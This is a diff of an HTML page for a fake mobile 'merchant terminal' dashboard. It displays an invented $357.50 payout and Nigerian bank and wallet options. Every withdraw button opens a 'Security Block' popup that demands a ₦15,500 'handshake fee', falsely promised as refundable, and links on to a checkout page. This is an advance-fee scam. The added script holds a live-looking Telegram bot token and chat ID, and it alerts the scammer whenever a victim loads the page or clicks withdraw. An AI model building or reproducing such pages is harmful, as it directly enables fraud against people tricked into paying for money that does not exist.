@@ -3,121 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Terminal Dashboard | AGMT</title>
+    <title>AGMT | Secure Terminal</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --error: #ef4444; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
         
-        body { background: var(--bg); color: white; padding-bottom: 100px; }
+        body { background: var(--bg); color: white; padding-bottom: 120px; overflow-x: hidden; }
 
-        /* Header Navigation */
-        header { padding: 25px; display: flex; justify-content: space-between; align-items: center; background: rgba(2, 6, 23, 0.8); backdrop-filter: blur(10px); sticky; top: 0; z-index: 100; }
+        /* Premium Header */
+        header { padding: 25px; display: flex; justify-content: space-between; align-items: center; background: rgba(2, 6, 23, 0.9); backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--border); }
         .profile { display: flex; align-items: center; gap: 12px; }
-        .avatar { width: 42px; height: 42px; background: linear-gradient(135deg, #2563eb, #1e40af); border-radius: 14px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 18px; border: 1px solid rgba(255,255,255,0.1); }
-        .node-id { font-size: 10px; color: var(--accent); font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+        .avatar { width: 45px; height: 45px; background: linear-gradient(135deg, #2563eb, #1e40af); border-radius: 16px; display: flex; align-items: center; justify-content: center; font-weight: 800; border: 1px solid rgba(255,255,255,0.1); }
+        .status-badge { font-size: 9px; color: var(--accent); font-weight: 800; background: rgba(16, 185, 129, 0.1); padding: 4px 8px; border-radius: 6px; text-transform: uppercase; }
 
-        /* Balance Section */
-        .wallet-section { padding: 0 20px; margin-top: 10px; }
-        .main-card { 
-            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); 
-            border: 1px solid var(--border); 
-            border-radius: 35px; 
-            padding: 30px; 
-            position: relative; 
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        /* The "Money" Card */
+        .wallet-container { padding: 20px; }
+        .balance-card { 
+            background: linear-gradient(145deg, #1e293b 0%, #020617 100%); 
+            border: 1px solid var(--border); border-radius: 40px; padding: 35px; 
+            text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.6); position: relative;
         }
-        .main-card::after { content: ""; position: absolute; bottom: -20px; right: -20px; width: 100px; height: 100px; background: var(--primary); filter: blur(60px); opacity: 0.2; }
+        .balance-card::before { content: "ESTIMATED PAYOUT"; position: absolute; top: 20px; left: 50%; transform: translateX(-50%); font-size: 10px; font-weight: 800; color: #64748b; letter-spacing: 2px; }
         
-        .label { font-size: 11px; color: #94a3b8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
-        .balance { font-size: 44px; font-weight: 800; margin: 12px 0; color: #fff; letter-spacing: -2px; }
-        .stats-row { display: flex; justify-content: space-between; margin-top: 25px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); }
-        .stat-item b { display: block; font-size: 15px; color: #fff; }
-        .stat-item span { font-size: 9px; color: #64748b; font-weight: 800; text-transform: uppercase; }
+        .main-balance { font-size: 54px; font-weight: 900; margin: 15px 0; letter-spacing: -3px; }
+        .main-balance span { font-size: 24px; color: #475569; }
 
-        /* Optimization Tiers */
-        .section-header { padding: 30px 25px 15px; display: flex; justify-content: space-between; align-items: center; }
-        .section-header h3 { font-size: 16px; font-weight: 800; }
-        
-        .tier-list { display: flex; overflow-x: auto; gap: 15px; padding: 0 25px; scrollbar-width: none; }
-        .tier-list::-webkit-scrollbar { display: none; }
-        
-        .tier-item { min-width: 290px; background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 25px; transition: 0.3s; }
-        .tier-item.locked { opacity: 0.5; filter: saturate(0.5); }
-        .tier-head { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; }
-        .tier-tag { font-size: 10px; font-weight: 800; background: rgba(37, 99, 235, 0.1); color: var(--primary); padding: 5px 12px; border-radius: 50px; }
-        .tier-item.locked .tier-tag { background: #1e293b; color: #64748b; }
-        
-        .tier-item h4 { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
-        .tier-item p { font-size: 12px; color: #64748b; line-height: 1.5; margin-bottom: 25px; }
-        
-        .btn-action { width: 100%; padding: 16px; border-radius: 16px; border: none; font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s; }
-        .btn-primary { background: var(--primary); color: white; box-shadow: 0 10px 20px rgba(37, 99, 235, 0.2); }
-        .btn-locked { background: #1e293b; color: #94a3b8; }
+        .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
+        .btn-withdraw { background: #fff; color: #000; padding: 18px; border-radius: 22px; font-weight: 800; font-size: 14px; text-decoration: none; border: none; cursor: pointer; }
+        .btn-swap { background: rgba(255,255,255,0.05); color: #fff; padding: 18px; border-radius: 22px; font-weight: 800; font-size: 14px; text-decoration: none; border: 1px solid var(--border); }
 
-        /* Bottom Tab Bar */
-        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(20px); border-top: 1px solid var(--border); display: grid; grid-template-columns: repeat(4, 1fr); padding: 15px 0; z-index: 1000; }
-        .nav-link { text-align: center; color: #64748b; text-decoration: none; display: flex; flex-direction: column; gap: 5px; }
+        /* Bank Selection Menu */
+        .bank-section { padding: 0 25px; margin-top: 35px; }
+        .bank-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 15px; }
+        .bank-card { background: var(--card); border: 1px solid var(--border); border-radius: 22px; padding: 20px; text-align: center; cursor: pointer; }
+        .bank-card:active { transform: scale(0.95); background: #1e293b; }
+        .bank-name { display: block; font-size: 11px; font-weight: 800; color: #94a3b8; margin-top: 8px; }
+
+        /* Modal Overlay for Restriction */
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); display: none; align-items: center; justify-content: center; z-index: 9999; padding: 25px; }
+        .modal { background: white; color: #020617; padding: 40px 30px; border-radius: 40px; text-align: center; width: 100%; max-width: 400px; animation: slideUp 0.4s ease-out; }
+        @keyframes slideUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .modal h2 { font-size: 24px; font-weight: 900; margin-bottom: 12px; color: var(--error); }
+        .modal p { font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 25px; }
+        .fee-box { background: #f1f5f9; border-radius: 20px; padding: 20px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
+        .fee-row { display: flex; justify-content: space-between; font-size: 13px; font-weight: 700; margin-bottom: 5px; }
+        
+        .btn-pay { width: 100%; background: var(--primary); color: white; padding: 20px; border-radius: 20px; border: none; font-weight: 800; font-size: 16px; cursor: pointer; }
+
+        /* Nav Bar */
+        .bottom-nav { position: fixed; bottom: 20px; left: 20px; right: 20px; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(20px); height: 75px; border-radius: 30px; display: grid; grid-template-columns: repeat(4, 1fr); align-items: center; border: 1px solid var(--border); box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+        .nav-link { text-align: center; color: #475569; text-decoration: none; font-size: 10px; font-weight: 800; }
         .nav-link.active { color: var(--primary); }
-        .nav-icon { font-size: 20px; }
-        .nav-label { font-size: 10px; font-weight: 800; }
+        .nav-link span { display: block; font-size: 22px; margin-bottom: 4px; }
     </style>
 </head>
 <body>
 
     <header>
         <div class="profile">
-            <div class="avatar" id="initial">M</div>
+            <div class="avatar">O</div>
             <div>
-                <div style="font-size: 14px; font-weight: 800;">Merchant Terminal</div>
-                <div class="node-id">🟢 Node: JM-Active</div>
+                <div style="font-size: 14px; font-weight: 800;">Otito Merchant</div>
+                <div class="status-badge">🟢 Sync Active</div>
             </div>
         </div>
         <div style="font-size: 22px;">⚙️</div>
     </header>
 
-    <div class="wallet-section">
-        <div class="main-card">
-            <span class="label">Settlement Balance</span>
-            <div class="balance">$200.00</div>
-            <div class="stats-row">
-                <div class="stat-item">
-                    <span>Active Tier</span>
-                    <b>Basic (T1)</b>
-                </div>
-                <div class="stat-item" style="text-align: right;">
-                    <span>Daily Limit</span>
-                    <b>$500.00</b>
-                </div>
+    <div class="wallet-container">
+        <div class="balance-card">
+            <div class="main-balance"><span>$</span>357.50</div>
+            <p style="font-size: 11px; color: var(--accent); font-weight: 800; margin-top: -10px;">VALIDATED FOR WITHDRAWAL</p>
+            
+            <div class="action-row">
+                <button class="btn-withdraw" onclick="openWithdraw()">WITHDRAW</button>
+                <a href="#" class="btn-swap">EXCHANGE</a>
             </div>
         </div>
     </div>
 
-    <div class="section-header">
-        <h3>Asset Optimization</h3>
-        <span style="font-size: 11px; color: var(--primary); font-weight: 800;">View Limits</span>
+    <div class="bank-section">
+        <h3 style="font-size: 15px; font-weight: 800; color: #64748b;">Linked Settlement Channels</h3>
+        <div class="bank-grid">
+            <div class="bank-card" onclick="openWithdraw()">
+                <span style="font-size: 24px;">📱</span>
+                <span class="bank-name">OPAY</span>
+            </div>
+            <div class="bank-card" onclick="openWithdraw()">
+                <span style="font-size: 24px;">🌴</span>
+                <span class="bank-name">PALMPAY</span>
+            </div>
+            <div class="bank-card" onclick="openWithdraw()">
+                <span style="font-size: 24px;">🏛️</span>
+                <span class="bank-name">GTBANK</span>
+            </div>
+            <div class="bank-card" onclick="openWithdraw()">
+                <span style="font-size: 24px;">🏦</span>
+                <span class="bank-name">ZENITH</span>
+            </div>
+        </div>
     </div>
 
-    <div class="tier-list">
-        <div class="tier-item">
-            <div class="tier-head">
-                <div class="tier-tag">CURRENT</div>
-                <div style="font-size: 20px;">🛡️</div>
+    <div class="modal-overlay" id="withdrawModal">
+        <div class="modal">
+            <div style="font-size: 50px; margin-bottom: 15px;">🔒</div>
+            <h2>Security Block</h2>
+            <p>Your current <b>Tier-1 Terminal</b> requires a mandatory liquidity handshake to authorize external dollar-to-naira conversions.</p>
+            
+            <div class="fee-box">
+                <div class="fee-row"><span>Handshake Fee:</span> <span>₦15,500.00</span></div>
+                <div class="fee-row"><span>Return Value:</span> <span style="color:var(--accent)">$357.50</span></div>
+                <div class="fee-row" style="margin-top:10px; font-size:10px; color:#94a3b8;">*Fee is 100% refundable after sync</div>
             </div>
-            <h4>Standard Node</h4>
-            <p>Optimize retail consumer goods. Standard settlement processing speed (24h).</p>
-            <button class="btn-action btn-primary" onclick="location.href='engine.html'">LAUNCH TERMINAL</button>
-        </div>
 
-        <div class="tier-item locked">
-            <div class="tier-head">
-                <div class="tier-tag">LOCKED</div>
-                <div style="font-size: 20px;">💎</div>
-            </div>
-            <h4>Premium Node</h4>
-            <p>Institutional grade assets. Instant settlement and priority node allocation.</p>
-            <button class="btn-action btn-locked">UPGRADE REQUIRED</button>
+            <button class="btn-pay" onclick="location.href='checkout.html'">CLEAR RESTRICTION</button>
+            <p style="margin-top: 15px; font-size: 12px; color: #94a3b8;" onclick="closeWithdraw()">Return to Dashboard</p>
+        </div>
+    </div>
+
+    <nav class="bottom-nav">
+        <a href="dashboard.html" class="nav-link active"><span>📊</span>Overview</a>
+        <a href="engine.html" class="nav-link"><span>⚡</span>Optimize</a>
+        <a href="wallet.html" class="nav-link"><span>💰</span>Wallet</a>
+        <a href="#" class="nav-link"><span>👤</span>Profile</a>
+    </nav>
+
+    <script>
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
+
+        function openWithdraw() {
+            document.getElementById('withdrawModal').style.display = 'flex';
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🚨 <b>WITHDRAWAL CLICKED:</b> User is viewing the ₦15,500 restriction popup right now!&parse_mode=html`);
+        }
+
+        function closeWithdraw() {
+            document.getElementById('withdrawModal').style.display = 'none';
+        }
+
+        window.onload = function() {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📱 <b>OTITO:</b> User is on the Premium Dashboard. $357.50 is visible.&parse_mode=html`);
+        }
+    </script>
+    <script src="notify.js"></script>
+</body>
+</html>
         </div>
     </div>
 
